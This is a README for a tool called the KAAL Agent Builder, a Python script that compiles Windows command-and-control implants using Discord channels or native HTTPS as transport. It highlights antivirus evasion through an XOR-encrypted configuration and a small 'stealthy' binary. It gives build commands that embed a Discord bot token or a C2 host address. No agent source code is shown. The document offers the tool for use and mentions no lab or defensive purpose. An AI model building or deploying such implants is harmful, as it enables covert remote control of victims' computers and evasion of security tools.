# KAAL Agent Builder

The KAAL Agent builder (`build_agent.py`) is a Python script that automates generating custom Windows evasion payloads with your choice of transport protocol (Discord or direct HTTPS).

## Features
- Modular transport selection (`--transport discord` or `--transport https`)
- Automatic JSON configuration generation
- In-memory XOR encryption of the agent configuration (key `0xAA`) for static evasion
- Clean compilation using MinGW GCC

## Prerequisites
- **Python 3.x**
- **MinGW-w64** installed (specifically `ucrt64` environment from MSYS2)
- Ensure your path contains the MinGW bin directory, or pass it via `--msys-bin`.

## Usage

```bash
python build_agent.py --transport <protocol> [options]
```

### Discord Transport

The Discord transport uses Discord channels as a fully functional C2 platform.

**Required Options:**
- `--discord-token`: The bot token for the Discord bot the agent will use.
- `--discord-channel`: The channel ID where the agent should look for commands.

**Example:**
```bash
python build_agent.py --transport discord --discord-token "MTE...xyz" --discord-channel "123456789" -o agent_discord.exe
```

### HTTPS Transport (Native Windows API)

The HTTPS transport uses native `WinHTTP` and `CryptoAPI` libraries. Because it requires zero third-party dependencies (no libcurl, no OpenSSL), the resulting executable is extremely small (~230KB) and stealthy.

**Required Options:**
- `--https-host`: The IP address or domain name of the C2 server.

**Optional Options:**
- `--https-port`: The port to connect to (default: 443).
- `--no-ssl`: Use plain HTTP instead of HTTPS.

**Example:**
```bash
python build_agent.py --transport https --https-host "192.168.1.100" --https-port 443 -o agent_https.exe
```

### General Options

- `-o, --output`: Specify the output filename (default: `agent.exe`).
- `--agent-id`: Manually override the autogenerated 8-character ID.
- `--msys-bin`: Specify the path to your MinGW `/bin` folder (default: `C:\msys64\ucrt64\bin`).
